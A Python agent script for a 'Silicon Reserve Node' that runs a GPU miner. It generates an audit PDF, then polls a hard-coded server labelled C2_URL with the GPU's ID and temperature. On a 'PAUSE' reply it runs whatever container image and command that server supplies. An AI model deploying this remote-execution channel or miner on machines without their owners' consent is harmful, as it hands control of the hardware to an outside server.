import asyncio
import aiohttp
import logging
import sys
import os
import json

# FLATTENED IMPORTS (Files sit next to each other in the Gist download)
try:
    import hardware
    import reporter
except ImportError:
    logging.warning("Audit modules missing. Using Mocks.")
    class hardware:
        @staticmethod
        def scan_system(): return [{"uuid": "MOCK-UUID", "temperature": 65}]
    class reporter:
        @staticmethod
        def generate_report(nodes, filename): pass

import process_controller
import container_manager

logging.basicConfig(level=logging.INFO, format='%(asctime)s - RESERVE NODE - %(levelname)s - %(message)s')

C2_URL = "https://apex-wp3u.onrender.com/heartbeat"
POLL_INTERVAL = 5
miner_ctrl = process_controller.MinerController()

async def execute_job(job_data):
    job_id = job_data.get("job_id")
    logging.warning(f"[!] PRIORITY JOB RECEIVED: {job_id}")
    miner_ctrl.pause()
    try:
        logging.info(f"[*] Pulling Container: {job_data.get('image')}...")
        logs = container_manager.run_container(job_data.get("image"), job_data.get("cmd"), use_gpu=True)
        logging.info(f"[$] Job Output: {logs[:50]}...")
    except Exception as e:
        logging.error(f"[X] Job Failed: {e}")
    finally:
        miner_ctrl.resume()

async def send_heartbeat(session):
    try:
        gpus = hardware.scan_system()
        primary = gpus[0] if gpus else {}
        payload = {
            "node_id": primary.get("uuid", "UNKNOWN"),
            "status": "IDLE",
            "gpu_temp": primary.get("temperature", 0)
        }
        async with session.post(C2_URL, json=payload, timeout=5) as response:
            if response.status == 200:
                data = await response.json()
                if data.get("command") == "PAUSE": await execute_job(data)
                else: logging.info(f"Heartbeat ACK. Status: {data.get('command')}")
    except Exception as e:
        logging.error(f"Connection Lost: {e}")

async def main():
    logging.info("Initializing Silicon Reserve Node...")
    try:
        gpus = hardware.scan_system()
        reporter.generate_report(gpus, filename="Silicon_Reserve_Audit.pdf")
        logging.info("[*] Audit Certificate Generated: Silicon_Reserve_Audit.pdf")
    except Exception as e:
        logging.warning(f"Audit Gen Failed: {e}")

    async with aiohttp.ClientSession() as session:
        while True:
            await send_heartbeat(session)
            await asyncio.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    asyncio.run(main())
